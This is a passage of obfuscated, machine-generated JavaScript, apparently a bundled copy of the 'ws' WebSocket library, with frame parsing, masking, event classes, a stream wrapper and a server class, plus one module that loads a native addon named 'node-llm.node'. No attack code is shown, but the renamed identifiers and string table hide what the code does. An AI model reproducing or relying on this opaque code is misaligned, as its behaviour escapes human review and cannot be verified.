                        _0x36aeb6 > Math[_0x3121cd(0x2e0)](0x2, 0x15) - 0x1 ? _0xba64a8(this[_0x3121cd(0x306)](RangeError, _0x3121cd(0x26b), !0x1, 0x3f1, _0x3121cd(0x253))) : (this[_0x3121cd(0x226)] = _0x36aeb6 * Math['pow'](0x2, 0x20) + _0x140ee0[_0x3121cd(0x268)](0x4), this[_0x3121cd(0x1d6)](_0xba64a8));
                    } [_0x2b7b09(0x1d6)](_0x29beea) {
                        const _0x40494b = _0x2b7b09;
                        this['_payloadLength'] && this[_0x40494b(0x2d9)] < 0x8 && (this[_0x40494b(0x336)] += this[_0x40494b(0x226)], this[_0x40494b(0x336)] > this[_0x40494b(0x325)] && this[_0x40494b(0x325)] > 0x0) ? _0x29beea(this[_0x40494b(0x306)](RangeError, _0x40494b(0x1df), !0x1, 0x3f1, _0x40494b(0x34c))) : this[_0x40494b(0x2e8)] ? this[_0x40494b(0x393)] = 0x3 : this[_0x40494b(0x393)] = 0x4;
                    } [_0x2b7b09(0x322)]() {
                        const _0xfed947 = _0x2b7b09;
                        this[_0xfed947(0x3a6)] < 0x4 ? this[_0xfed947(0x237)] = !0x1 : (this[_0xfed947(0x391)] = this[_0xfed947(0x318)](0x4), this[_0xfed947(0x393)] = 0x4);
                    } [_0x2b7b09(0x3aa)](_0x2c058d) {
                        const _0x5ff0f8 = _0x2b7b09;
                        let _0x27bdd8 = _0x55ff4d;
                        if (this[_0x5ff0f8(0x226)]) {
                            if (this[_0x5ff0f8(0x3a6)] < this[_0x5ff0f8(0x226)]) return void(this[_0x5ff0f8(0x237)] = !0x1);
                            _0x27bdd8 = this[_0x5ff0f8(0x318)](this[_0x5ff0f8(0x226)]), this['_masked'] && 0x0 !== (this['_mask'][0x0] | this[_0x5ff0f8(0x391)][0x1] | this[_0x5ff0f8(0x391)][0x2] | this['_mask'][0x3]) && _0x56ba4e(_0x27bdd8, this['_mask']);
                        }
                        if (this[_0x5ff0f8(0x2d9)] > 0x7) this[_0x5ff0f8(0x1cd)](_0x27bdd8, _0x2c058d);
                        else {
                            if (this[_0x5ff0f8(0x319)]) return this[_0x5ff0f8(0x393)] = 0x5, void this[_0x5ff0f8(0x386)](_0x27bdd8, _0x2c058d);
                            _0x27bdd8[_0x5ff0f8(0x265)] && (this['_messageLength'] = this['_totalPayloadLength'], this[_0x5ff0f8(0x1dc)]['push'](_0x27bdd8)), this[_0x5ff0f8(0x232)](_0x2c058d);
                        }
                    } ['decompress'](_0x42bb76, _0x14ba6c) {
                        const _0x578763 = _0x2b7b09;
                        this[_0x578763(0x2dc)][_0x378fdb[_0x578763(0x2ad)]][_0x578763(0x386)](_0x42bb76, this['_fin'], (_0x2a61af, _0x1eba6b) => {
                            const _0x4b272b = _0x578763;
                            if (_0x2a61af) return _0x14ba6c(_0x2a61af);
                            if (_0x1eba6b[_0x4b272b(0x265)]) {
                                if (this[_0x4b272b(0x1d2)] += _0x1eba6b[_0x4b272b(0x265)], this[_0x4b272b(0x1d2)] > this['_maxPayload'] && this[_0x4b272b(0x325)] > 0x0) {
                                    const _0x2cbbb3 = this[_0x4b272b(0x306)](RangeError, _0x4b272b(0x1df), !0x1, 0x3f1, 'WS_ERR_UNSUPPORTED_MESSAGE_LENGTH');
                                    return void _0x14ba6c(_0x2cbbb3);
                                }
                                this['_fragments']['push'](_0x1eba6b);
                            }
                            this[_0x4b272b(0x232)](_0x14ba6c), 0x0 === this[_0x4b272b(0x393)] && this[_0x4b272b(0x330)](_0x14ba6c);
                        });
                    } ['dataMessage'](_0x424083) {
                        const _0x452fc9 = _0x2b7b09;
                        if (!this[_0x452fc9(0x2f5)]) return void(this[_0x452fc9(0x393)] = 0x0);
                        const _0x29043c = this[_0x452fc9(0x1d2)],
                            _0xd6c1c1 = this[_0x452fc9(0x1dc)];
                        if (this[_0x452fc9(0x336)] = 0x0, this[_0x452fc9(0x1d2)] = 0x0, this[_0x452fc9(0x2f6)] = 0x0, this['_fragments'] = [], 0x2 === this[_0x452fc9(0x2d9)]) {
                            let _0x1abb03;
                            _0x1abb03 = 'nodebuffer' === this['_binaryType'] ? _0x49ba07(_0xd6c1c1, _0x29043c) : 'arraybuffer' === this[_0x452fc9(0x2d8)] ? _0x1ccead(_0x49ba07(_0xd6c1c1, _0x29043c)) : 'blob' === this[_0x452fc9(0x2d8)] ? new Blob(_0xd6c1c1) : _0xd6c1c1, this[_0x452fc9(0x2a4)] ? (this[_0x452fc9(0x31d)](_0x452fc9(0x37e), _0x1abb03, !0x0), this[_0x452fc9(0x393)] = 0x0) : (this[_0x452fc9(0x393)] = 0x6, setImmediate(() => {
                                const _0x46b17c = _0x452fc9;
                                this[_0x46b17c(0x31d)](_0x46b17c(0x37e), _0x1abb03, !0x0), this[_0x46b17c(0x393)] = 0x0, this[_0x46b17c(0x330)](_0x424083);
                            }));
                        } else {
                            const _0x342294 = _0x49ba07(_0xd6c1c1, _0x29043c);
                            if (!this[_0x452fc9(0x1d3)] && !_0x1d8b4e(_0x342294)) {
                                const _0xba6714 = this[_0x452fc9(0x306)](Error, 'invalid UTF-8 sequence', !0x0, 0x3ef, _0x452fc9(0x2f4));
                                return void _0x424083(_0xba6714);
                            }
                            0x5 === this[_0x452fc9(0x393)] || this[_0x452fc9(0x2a4)] ? (this[_0x452fc9(0x31d)](_0x452fc9(0x37e), _0x342294, !0x1), this[_0x452fc9(0x393)] = 0x0) : (this[_0x452fc9(0x393)] = 0x6, setImmediate(() => {
                                const _0x27ae25 = _0x452fc9;
                                this[_0x27ae25(0x31d)](_0x27ae25(0x37e), _0x342294, !0x1), this['_state'] = 0x0, this[_0x27ae25(0x330)](_0x424083);
                            }));
                        }
                    } ['controlMessage'](_0xeb4cbe, _0x197c77) {
                        const _0x1381bf = _0x2b7b09;
                        if (0x8 !== this[_0x1381bf(0x2d9)]) this[_0x1381bf(0x2a4)] ? (this[_0x1381bf(0x31d)](0x9 === this[_0x1381bf(0x2d9)] ? _0x1381bf(0x266) : _0x1381bf(0x229), _0xeb4cbe), this[_0x1381bf(0x393)] = 0x0) : (this[_0x1381bf(0x393)] = 0x6, setImmediate(() => {
                            const _0x33241c = _0x1381bf;
                            this['emit'](0x9 === this[_0x33241c(0x2d9)] ? _0x33241c(0x266) : _0x33241c(0x229), _0xeb4cbe), this['_state'] = 0x0, this[_0x33241c(0x330)](_0x197c77);
                        }));
                        else {
                            if (0x0 === _0xeb4cbe['length']) this[_0x1381bf(0x237)] = !0x1, this[_0x1381bf(0x31d)]('conclude', 0x3ed, _0x55ff4d), this[_0x1381bf(0x362)]();
                            else {
                                const _0x9710ae = _0xeb4cbe[_0x1381bf(0x36c)](0x0);
                                if (!_0x4757f4(_0x9710ae)) {
                                    const _0x50bc53 = this[_0x1381bf(0x306)](RangeError, _0x1381bf(0x264) + _0x9710ae, !0x0, 0x3ea, _0x1381bf(0x301));
                                    return void _0x197c77(_0x50bc53);
                                }
                                const _0x1cb5d2 = new _0x53b42b(_0xeb4cbe[_0x1381bf(0x27c)], _0xeb4cbe[_0x1381bf(0x21e)] + 0x2, _0xeb4cbe[_0x1381bf(0x265)] - 0x2);
                                if (!this['_skipUTF8Validation'] && !_0x1d8b4e(_0x1cb5d2)) {
                                    const _0x301469 = this[_0x1381bf(0x306)](Error, 'invalid UTF-8 sequence', !0x0, 0x3ef, _0x1381bf(0x2f4));
                                    return void _0x197c77(_0x301469);
                                }
                                this[_0x1381bf(0x237)] = !0x1, this[_0x1381bf(0x31d)](_0x1381bf(0x2a8), _0x9710ae, _0x1cb5d2), this['end']();
                            }
                            this[_0x1381bf(0x393)] = 0x0;
                        }
                    } [_0x2b7b09(0x306)](_0x3c78d9, _0x1fc61a, _0xae5d4e, _0x374fcf, _0x185aba) {
                        const _0x316c58 = _0x2b7b09;
                        this[_0x316c58(0x237)] = !0x1, this['_errored'] = !0x0;
                        const _0x47527c = new _0x3c78d9(_0xae5d4e ? _0x316c58(0x230) + _0x1fc61a : _0x1fc61a);
                        return Error[_0x316c58(0x2ce)](_0x47527c, this['createError']), _0x47527c[_0x316c58(0x24b)] = _0x185aba, _0x47527c[_0x40b697] = _0x374fcf, _0x47527c;
                    }
                };
            },
            0x152(_0x5e1a40, _0x5ea7ce, _0x51b4c5) {
                'use strict';
                const _0x5ad77a = a0_0x2568;
                const {
                    EMPTY_BUFFER: _0x2d4cc5
                } = _0x51b4c5(0x266), _0xcb8bc5 = Buffer[Symbol[_0x5ad77a(0x295)]];

                function _0x587918(_0x5ed149, _0x4ac8f8, _0x20c54f, _0x257174, _0x541d03) {
                    for (let _0x341737 = 0x0; _0x341737 < _0x541d03; _0x341737++) _0x20c54f[_0x257174 + _0x341737] = _0x5ed149[_0x341737] ^ _0x4ac8f8[0x3 & _0x341737];
                }

                function _0x49808a(_0x7f6bbd, _0x1b38d1) {
                    const _0x1b0447 = _0x5ad77a;
                    for (let _0xf612a6 = 0x0; _0xf612a6 < _0x7f6bbd[_0x1b0447(0x265)]; _0xf612a6++) _0x7f6bbd[_0xf612a6] ^= _0x1b38d1[0x3 & _0xf612a6];
                }
                if (_0x5e1a40[_0x5ad77a(0x291)] = {
                        'concat': function (_0x590c5f, _0x3d6700) {
                            const _0x5734a5 = _0x5ad77a;
                            if (0x0 === _0x590c5f[_0x5734a5(0x265)]) return _0x2d4cc5;
                            if (0x1 === _0x590c5f[_0x5734a5(0x265)]) return _0x590c5f[0x0];
                            const _0x397aa6 = Buffer[_0x5734a5(0x21b)](_0x3d6700);
                            let _0x46ea94 = 0x0;
                            for (let _0x1ea640 = 0x0; _0x1ea640 < _0x590c5f[_0x5734a5(0x265)]; _0x1ea640++) {
                                const _0x558717 = _0x590c5f[_0x1ea640];
                                _0x397aa6[_0x5734a5(0x30b)](_0x558717, _0x46ea94), _0x46ea94 += _0x558717[_0x5734a5(0x265)];
                            }
                            return _0x46ea94 < _0x3d6700 ? new _0xcb8bc5(_0x397aa6['buffer'], _0x397aa6[_0x5734a5(0x21e)], _0x46ea94) : _0x397aa6;
                        },
                        'mask': _0x587918,
                        'toArrayBuffer': function (_0x1635c2) {
                            const _0x2aad61 = _0x5ad77a;
                            return _0x1635c2[_0x2aad61(0x265)] === _0x1635c2[_0x2aad61(0x27c)][_0x2aad61(0x278)] ? _0x1635c2[_0x2aad61(0x27c)] : _0x1635c2[_0x2aad61(0x27c)]['slice'](_0x1635c2[_0x2aad61(0x21e)], _0x1635c2[_0x2aad61(0x21e)] + _0x1635c2[_0x2aad61(0x265)]);
                        },
                        'toBuffer': function _0x7a0bcf(_0x29b5d9) {
                            const _0x21bf1d = _0x5ad77a;
                            if (_0x7a0bcf[_0x21bf1d(0x39a)] = !0x0, Buffer[_0x21bf1d(0x307)](_0x29b5d9)) return _0x29b5d9;
                            let _0x3c4aab;
                            return _0x29b5d9 instanceof ArrayBuffer ? _0x3c4aab = new _0xcb8bc5(_0x29b5d9) : ArrayBuffer[_0x21bf1d(0x297)](_0x29b5d9) ? _0x3c4aab = new _0xcb8bc5(_0x29b5d9['buffer'], _0x29b5d9[_0x21bf1d(0x21e)], _0x29b5d9[_0x21bf1d(0x278)]) : (_0x3c4aab = Buffer[_0x21bf1d(0x316)](_0x29b5d9), _0x7a0bcf['readOnly'] = !0x1), _0x3c4aab;
                        },
                        'unmask': _0x49808a
                    }, !process['env'][_0x5ad77a(0x279)]) try {
                    const _0x4a1abf = _0x51b4c5(Object((function () {
                        const _0x1f253f = _0x5ad77a;
                        var _0x4561d0 = new Error(_0x1f253f(0x215));
                        throw _0x4561d0['code'] = 'MODULE_NOT_FOUND', _0x4561d0;
                    }())));
                    _0x5e1a40[_0x5ad77a(0x291)][_0x5ad77a(0x28c)] = function (_0x51cd42, _0x5c2d89, _0x5c5576, _0x1838cf, _0x4f95d5) {
                        const _0x36b73a = _0x5ad77a;
                        _0x4f95d5 < 0x30 ? _0x587918(_0x51cd42, _0x5c2d89, _0x5c5576, _0x1838cf, _0x4f95d5) : _0x4a1abf[_0x36b73a(0x28c)](_0x51cd42, _0x5c2d89, _0x5c5576, _0x1838cf, _0x4f95d5);
                    }, _0x5e1a40['exports'][_0x5ad77a(0x349)] = function (_0x19034b, _0x1817fd) {
                        const _0xcf9c93 = _0x5ad77a;
                        _0x19034b[_0xcf9c93(0x265)] < 0x20 ? _0x49808a(_0x19034b, _0x1817fd) : _0x4a1abf['unmask'](_0x19034b, _0x1817fd);
                    };
                } catch (_0x145591) {}
            },
            0x1b2(_0x32185e) {
                'use strict';
                const _0xaf3650 = a0_0x2568;
                _0x32185e[_0xaf3650(0x291)] = require(_0xaf3650(0x204));
            },
            0x240(_0x37592a, _0x445887, _0x561037) {
                const _0x2135d6 = a0_0x2568;
                _0x37592a = _0x561037[_0x2135d6(0x1d4)](_0x37592a);
                try {
                    process[_0x2135d6(0x38b)](_0x37592a, _0x561037(0x3a0)[_0x2135d6(0x2ab)](__dirname, _0x561037['p'], 'packages/llm/node-llm.node'));
                } catch (_0x401207) {
                    throw new Error(_0x2135d6(0x249) + _0x401207);
                }
            },
            0x255(_0x429a7a, _0x2cfcc4, _0x1a83a8) {
                'use strict';
                const _0x48c5cd = a0_0x2568;
                const {
                    kForOnEventAttribute: _0x59497d,
                    kListener: _0x5518c6
                } = _0x1a83a8(0x266), _0x5466bb = Symbol('kCode'), _0x1113a2 = Symbol(_0x48c5cd(0x241)), _0x17496c = Symbol('kError'), _0x567978 = Symbol(_0x48c5cd(0x29d)), _0xbe558b = Symbol(_0x48c5cd(0x1f1)), _0x5a1558 = Symbol(_0x48c5cd(0x200)), _0x202204 = Symbol(_0x48c5cd(0x2e4)), _0x54f4bf = Symbol(_0x48c5cd(0x275));
                class _0xecf7e3 {
                    constructor(_0xed6579) {
                        this[_0x5a1558] = null, this[_0x202204] = _0xed6579;
                    }
                    get[_0x48c5cd(0x351)]() {
                        return this[_0x5a1558];
                    }
                    get['type']() {
                        return this[_0x202204];
                    }
                }
                Object[_0x48c5cd(0x1f4)](_0xecf7e3[_0x48c5cd(0x24a)], _0x48c5cd(0x351), {
                    'enumerable': !0x0
                }), Object['defineProperty'](_0xecf7e3[_0x48c5cd(0x24a)], _0x48c5cd(0x2fc), {
                    'enumerable': !0x0
                });
                class _0x349bef extends _0xecf7e3 {
                    constructor(_0x18dbc7, _0x5a7f40 = {}) {
                        const _0x2ce6a8 = _0x48c5cd;
                        super(_0x18dbc7), this[_0x5466bb] = void 0x0 === _0x5a7f40[_0x2ce6a8(0x24b)] ? 0x0 : _0x5a7f40[_0x2ce6a8(0x24b)], this[_0xbe558b] = void 0x0 === _0x5a7f40[_0x2ce6a8(0x2c7)] ? '' : _0x5a7f40[_0x2ce6a8(0x2c7)], this[_0x54f4bf] = void 0x0 !== _0x5a7f40[_0x2ce6a8(0x20a)] && _0x5a7f40[_0x2ce6a8(0x20a)];
                    }
                    get['code']() {
                        return this[_0x5466bb];
                    }
                    get['reason']() {
                        return this[_0xbe558b];
                    }
                    get[_0x48c5cd(0x20a)]() {
                        return this[_0x54f4bf];
                    }
                }
                Object[_0x48c5cd(0x1f4)](_0x349bef[_0x48c5cd(0x24a)], _0x48c5cd(0x24b), {
                    'enumerable': !0x0
                }), Object[_0x48c5cd(0x1f4)](_0x349bef[_0x48c5cd(0x24a)], _0x48c5cd(0x2c7), {
                    'enumerable': !0x0
                }), Object[_0x48c5cd(0x1f4)](_0x349bef[_0x48c5cd(0x24a)], _0x48c5cd(0x20a), {
                    'enumerable': !0x0
                });
                class _0x4954aa extends _0xecf7e3 {
                    constructor(_0x194f5a, _0xe63cb6 = {}) {
                        const _0x323c09 = _0x48c5cd;
                        super(_0x194f5a), this[_0x17496c] = void 0x0 === _0xe63cb6[_0x323c09(0x2ee)] ? null : _0xe63cb6['error'], this[_0x567978] = void 0x0 === _0xe63cb6[_0x323c09(0x37e)] ? '' : _0xe63cb6['message'];
                    }
                    get[_0x48c5cd(0x2ee)]() {
                        return this[_0x17496c];
                    }
                    get[_0x48c5cd(0x37e)]() {
                        return this[_0x567978];
                    }
                }
                Object['defineProperty'](_0x4954aa['prototype'], _0x48c5cd(0x2ee), {
                    'enumerable': !0x0
                }), Object[_0x48c5cd(0x1f4)](_0x4954aa[_0x48c5cd(0x24a)], _0x48c5cd(0x37e), {
                    'enumerable': !0x0
                });
                class _0xaca7ee extends _0xecf7e3 {
                    constructor(_0x507e52, _0x45c92d = {}) {
                        const _0x1858e2 = _0x48c5cd;
                        super(_0x507e52), this[_0x1113a2] = void 0x0 === _0x45c92d[_0x1858e2(0x387)] ? null : _0x45c92d[_0x1858e2(0x387)];
                    }
                    get[_0x48c5cd(0x387)]() {
                        return this[_0x1113a2];
                    }
                }
                Object[_0x48c5cd(0x1f4)](_0xaca7ee[_0x48c5cd(0x24a)], _0x48c5cd(0x387), {
                    'enumerable': !0x0
                });
                const _0x27e9f0 = {
                    'addEventListener'(_0x29b709, _0x289756, _0x23f70d = {}) {
                        const _0x381f56 = _0x48c5cd;
                        for (const _0x551153 of this[_0x381f56(0x2ef)](_0x29b709))
                            if (!_0x23f70d[_0x59497d] && _0x551153[_0x5518c6] === _0x289756 && !_0x551153[_0x59497d]) return;
                        let _0x54a52d;
                        if (_0x381f56(0x37e) === _0x29b709) _0x54a52d = function (_0x59bfe3, _0x40f8dc) {
                            const _0x3ed0a8 = new _0xaca7ee('message', {
                                'data': _0x40f8dc ? _0x59bfe3 : _0x59bfe3['toString']()
                            });
                            _0x3ed0a8[_0x5a1558] = this, _0x173dda(_0x289756, this, _0x3ed0a8);
                        };
                        else {
                            if ('close' === _0x29b709) _0x54a52d = function (_0xab140a, _0x23c480) {
                                const _0x243253 = _0x381f56,
                                    _0x5dec26 = new _0x349bef('close', {
                                        'code': _0xab140a,
                                        'reason': _0x23c480['toString'](),
                                        'wasClean': this[_0x243253(0x1f7)] && this['_closeFrameSent']
                                    });
                                _0x5dec26[_0x5a1558] = this, _0x173dda(_0x289756, this, _0x5dec26);
                            };
                            else {
                                if (_0x381f56(0x2ee) === _0x29b709) _0x54a52d = function (_0x5e591b) {
                                    const _0x2a3007 = _0x381f56,
                                        _0x5622a1 = new _0x4954aa(_0x2a3007(0x2ee), {
                                            'error': _0x5e591b,
                                            'message': _0x5e591b['message']
                                        });
                                    _0x5622a1[_0x5a1558] = this, _0x173dda(_0x289756, this, _0x5622a1);
                                };
                                else {
                                    if (_0x381f56(0x31a) !== _0x29b709) return;
                                    _0x54a52d = function () {
                                        const _0x155f20 = _0x381f56,
                                            _0x10996a = new _0xecf7e3(_0x155f20(0x31a));
                                        _0x10996a[_0x5a1558] = this, _0x173dda(_0x289756, this, _0x10996a);
                                    };
                                }
                            }
                        }
                        _0x54a52d[_0x59497d] = !!_0x23f70d[_0x59497d], _0x54a52d[_0x5518c6] = _0x289756, _0x23f70d[_0x381f56(0x2f8)] ? this[_0x381f56(0x2f8)](_0x29b709, _0x54a52d) : this['on'](_0x29b709, _0x54a52d);
                    },
                    'removeEventListener'(_0xdb59f0, _0x4c5861) {
                        const _0x2333df = _0x48c5cd;
                        for (const _0x2dddf7 of this[_0x2333df(0x2ef)](_0xdb59f0))
                            if (_0x2dddf7[_0x5518c6] === _0x4c5861 && !_0x2dddf7[_0x59497d]) {
                                this[_0x2333df(0x1eb)](_0xdb59f0, _0x2dddf7);
                                break;
                            }
                    }
                };

                function _0x173dda(_0x5cec61, _0x2c548c, _0x381065) {
                    const _0xb16f92 = _0x48c5cd;
                    'object' == typeof _0x5cec61 && _0x5cec61['handleEvent'] ? _0x5cec61[_0xb16f92(0x38d)][_0xb16f92(0x209)](_0x5cec61, _0x381065) : _0x5cec61[_0xb16f92(0x209)](_0x2c548c, _0x381065);
                }
                _0x429a7a[_0x48c5cd(0x291)] = {
                    'CloseEvent': _0x349bef,
                    'ErrorEvent': _0x4954aa,
                    'Event': _0xecf7e3,
                    'EventTarget': _0x27e9f0,
                    'MessageEvent': _0xaca7ee
                };
            },
            0x263(_0x16bdcb) {
                'use strict';
                const _0x28acac = a0_0x2568;
                _0x16bdcb[_0x28acac(0x291)] = require(_0x28acac(0x2c1));
            },
            0x266(_0x4e3c2c) {
                'use strict';
                const _0x4066fa = a0_0x2568;
                const _0x43c5c0 = [_0x4066fa(0x272), _0x4066fa(0x1db), _0x4066fa(0x2c5)],
                    _0xd969 = 'undefined' != typeof Blob;
                _0xd969 && _0x43c5c0[_0x4066fa(0x1fe)](_0x4066fa(0x255)), _0x4e3c2c[_0x4066fa(0x291)] = {
                    'BINARY_TYPES': _0x43c5c0,
                    'EMPTY_BUFFER': Buffer[_0x4066fa(0x31c)](0x0),
                    'GUID': _0x4066fa(0x3a9),
                    'hasBlob': _0xd969,
                    'kForOnEventAttribute': Symbol(_0x4066fa(0x317)),
                    'kListener': Symbol(_0x4066fa(0x2db)),
                    'kStatusCode': Symbol('status-code'),
                    'kWebSocket': Symbol(_0x4066fa(0x290)),
                    'NOOP': () => {}
                };
            },
            0x2b4(_0x21dd58) {
                'use strict';
                _0x21dd58['exports'] = require('https');
            },
            0x2bb(_0x785406, _0x5174ca, _0x230852) {
                'use strict';
                const _0x2df7db = a0_0x2568;
                const _0x20aa08 = _0x230852(0x3c);
                _0x20aa08['createWebSocketStream'] = _0x230852(0x2cf), _0x20aa08[_0x2df7db(0x23c)] = _0x230852(0x2d2), _0x20aa08[_0x2df7db(0x29e)] = _0x230852(0x11e), _0x20aa08[_0x2df7db(0x26c)] = _0x230852(0x392), _0x20aa08[_0x2df7db(0x329)] = _0x20aa08, _0x20aa08['WebSocketServer'] = _0x20aa08[_0x2df7db(0x23c)], _0x785406[_0x2df7db(0x291)] = _0x20aa08;
            },
            0x2cf(_0x487d29, _0x4ef51d, _0x4e9e07) {
                'use strict';
                const _0x3b37f0 = a0_0x2568;
                _0x4e9e07(0x3c);
                const {
                    Duplex: _0x1fe4d8
                } = _0x4e9e07(0xcb);

                function _0xa3fadb(_0x3b1891) {
                    const _0xe7f7ca = a0_0x2568;
                    _0x3b1891[_0xe7f7ca(0x31d)](_0xe7f7ca(0x2b4));
                }

                function _0x4f3727() {
                    const _0x5b86e8 = a0_0x2568;
                    !this[_0x5b86e8(0x328)] && this[_0x5b86e8(0x1d9)][_0x5b86e8(0x304)] && this[_0x5b86e8(0x2ea)]();
                }

                function _0x4d869b(_0x12d830) {
                    const _0x2eab1e = a0_0x2568;
                    this[_0x2eab1e(0x1eb)]('error', _0x4d869b), this['destroy'](), 0x0 === this['listenerCount'](_0x2eab1e(0x2ee)) && this[_0x2eab1e(0x31d)](_0x2eab1e(0x2ee), _0x12d830);
                }
                _0x487d29[_0x3b37f0(0x291)] = function (_0x3c0359, _0x4b48ca) {
                    const _0x21587a = _0x3b37f0;
                    let _0x1f5a34 = !0x0;
                    const _0x1def88 = new _0x1fe4d8({
                        ..._0x4b48ca,
                        'autoDestroy': !0x1,
                        'emitClose': !0x1,
                        'objectMode': !0x1,
                        'writableObjectMode': !0x1
                    });
                    return _0x3c0359['on'](_0x21587a(0x37e), function (_0x46f251, _0x45aa04) {
                        const _0x3b0018 = _0x21587a,
                            _0x4e5233 = !_0x45aa04 && _0x1def88[_0x3b0018(0x250)][_0x3b0018(0x310)] ? _0x46f251['toString']() : _0x46f251;
                        _0x1def88['push'](_0x4e5233) || _0x3c0359[_0x3b0018(0x243)]();
                    }), _0x3c0359[_0x21587a(0x2f8)]('error', function (_0x327935) {
                        const _0xe3bbe0 = _0x21587a;
                        _0x1def88[_0xe3bbe0(0x328)] || (_0x1f5a34 = !0x1, _0x1def88[_0xe3bbe0(0x2ea)](_0x327935));
                    }), _0x3c0359['once'](_0x21587a(0x2b4), function () {
                        const _0x32e0e4 = _0x21587a;
                        _0x1def88[_0x32e0e4(0x328)] || _0x1def88['push'](null);
                    }), _0x1def88[_0x21587a(0x23f)] = function (_0x4a5023, _0x46b3e1) {
                        const _0x49c656 = _0x21587a;
                        if (_0x3c0359[_0x49c656(0x36a)] === _0x3c0359[_0x49c656(0x2bf)]) return _0x46b3e1(_0x4a5023), void process[_0x49c656(0x39e)](_0xa3fadb, _0x1def88);
                        let _0x4d05c8 = !0x1;
                        _0x3c0359[_0x49c656(0x2f8)](_0x49c656(0x2ee), function (_0x91abde) {
                            _0x4d05c8 = !0x0, _0x46b3e1(_0x91abde);
                        }), _0x3c0359['once'](_0x49c656(0x2b4), function () {
                            const _0x486bde = _0x49c656;
                            _0x4d05c8 || _0x46b3e1(_0x4a5023), process[_0x486bde(0x39e)](_0xa3fadb, _0x1def88);
                        }), _0x1f5a34 && _0x3c0359['terminate']();
                    }, _0x1def88[_0x21587a(0x29f)] = function (_0x26c9bc) {
                        const _0x58dc04 = _0x21587a;
                        _0x3c0359[_0x58dc04(0x36a)] !== _0x3c0359['CONNECTING'] ? null !== _0x3c0359['_socket'] && (_0x3c0359[_0x58dc04(0x37b)][_0x58dc04(0x1d9)][_0x58dc04(0x304)] ? (_0x26c9bc(), _0x1def88[_0x58dc04(0x250)][_0x58dc04(0x234)] && _0x1def88['destroy']()) : (_0x3c0359[_0x58dc04(0x37b)]['once'](_0x58dc04(0x371), function () {
                            _0x26c9bc();
                        }), _0x3c0359[_0x58dc04(0x2b4)]())) : _0x3c0359['once'](_0x58dc04(0x31a), function () {
                            const _0x3564d8 = _0x58dc04;
                            _0x1def88[_0x3564d8(0x29f)](_0x26c9bc);
                        });
                    }, _0x1def88[_0x21587a(0x32b)] = function () {
                        const _0x2068f0 = _0x21587a;
                        _0x3c0359['isPaused'] && _0x3c0359[_0x2068f0(0x2fd)]();
                    }, _0x1def88[_0x21587a(0x396)] = function (_0x48bfd8, _0x468c84, _0x458369) {
                        const _0x2bb5bf = _0x21587a;
                        _0x3c0359[_0x2bb5bf(0x36a)] !== _0x3c0359['CONNECTING'] ? _0x3c0359['send'](_0x48bfd8, _0x458369) : _0x3c0359['once'](_0x2bb5bf(0x31a), function () {
                            const _0x16b624 = _0x2bb5bf;
                            _0x1def88[_0x16b624(0x396)](_0x48bfd8, _0x468c84, _0x458369);
                        });
                    }, _0x1def88['on'](_0x21587a(0x362), _0x4f3727), _0x1def88['on'](_0x21587a(0x2ee), _0x4d869b), _0x1def88;
                };
            },
            0x2d2(_0x13c1a5, _0x10faf0, _0x204406) {
                'use strict';
                const _0x5bf4e7 = a0_0x2568;
                const _0x25c3d7 = _0x204406(0x1b2),
                    _0x25fa8f = _0x204406(0x263),
                    {
                        Duplex: _0x5582df
                    } = _0x204406(0xcb),
                    {
                        createHash: _0x5dfcd6
                    } = _0x204406(0x3d6),
                    _0x2b2d66 = _0x204406(0x39e),
                    _0x428b94 = _0x204406(0x3cb),
                    _0x1cd636 = _0x204406(0xed),
                    _0x3b64a3 = _0x204406(0x3c),
                    {
                        GUID: _0x59b501,
                        kWebSocket: _0x288653
                    } = _0x204406(0x266),
                    _0x1bd5f8 = /^[+/0-9A-Za-z]{22}==$/;

                function _0x26fa85(_0x32d35a) {
                    const _0x57231b = a0_0x2568;
                    _0x32d35a[_0x57231b(0x393)] = 0x2, _0x32d35a[_0x57231b(0x31d)](_0x57231b(0x2b4));
                }

                function _0x4c5ceb() {
                    const _0x2b3758 = a0_0x2568;
                    this[_0x2b3758(0x2ea)]();
                }

                function _0x890f9(_0x4cd90c, _0x5bde7f, _0x19f3fb, _0x4e8fcd) {
                    const _0x59d1fa = a0_0x2568;
                    _0x19f3fb = _0x19f3fb || _0x25fa8f[_0x59d1fa(0x22d)][_0x5bde7f], _0x4e8fcd = {
                        'Connection': 'close',
                        'Content-Type': _0x59d1fa(0x388),
                        'Content-Length': Buffer[_0x59d1fa(0x278)](_0x19f3fb),
                        ..._0x4e8fcd
                    }, _0x4cd90c['once']('finish', _0x4cd90c[_0x59d1fa(0x2ea)]), _0x4cd90c[_0x59d1fa(0x362)](_0x59d1fa(0x383) + _0x5bde7f + ' ' + _0x25fa8f['STATUS_CODES'][_0x5bde7f] + '\x0d\x0a' + Object[_0x59d1fa(0x2e5)](_0x4e8fcd)['map'](_0x2ae1ce => _0x2ae1ce + ': ' + _0x4e8fcd[_0x2ae1ce])[_0x59d1fa(0x2ab)]('\x0d\x0a') + '\x0d\x0a\x0d\x0a' + _0x19f3fb);
                }

                function _0x56aed6(_0x5c8ef0, _0x144df2, _0x422ccd, _0x1b3da1, _0x586309, _0x564431) {
                    const _0x45cb78 = a0_0x2568;
                    if (_0x5c8ef0[_0x45cb78(0x1d1)](_0x45cb78(0x373))) {
                        const _0x46fe90 = new Error(_0x586309);
                        Error[_0x45cb78(0x2ce)](_0x46fe90, _0x56aed6), _0x5c8ef0[_0x45cb78(0x31d)](_0x45cb78(0x373), _0x46fe90, _0x422ccd, _0x144df2);
                    } else _0x890f9(_0x422ccd, _0x1b3da1, _0x586309, _0x564431);
                }
                _0x13c1a5[_0x5bf4e7(0x291)] = class extends _0x25c3d7 {
                    constructor(_0x5b3a30, _0x59f9e1) {
                        const _0x13a315 = _0x5bf4e7;
                        if (super(), null == (_0x5b3a30 = {
                                'allowSynchronousEvents': !0x0,
                                'autoPong': !0x0,
                                'maxPayload': 0x6400000,
                                'skipUTF8Validation': !0x1,
                                'perMessageDeflate': !0x1,
                                'handleProtocols': null,
                                'clientTracking': !0x0,
                                'verifyClient': null,
                                'noServer': !0x1,
                                'backlog': null,
                                'server': null,
                                'host': null,
                                'path': null,
                                'port': null,
                                'WebSocket': _0x3b64a3,
                                ..._0x5b3a30
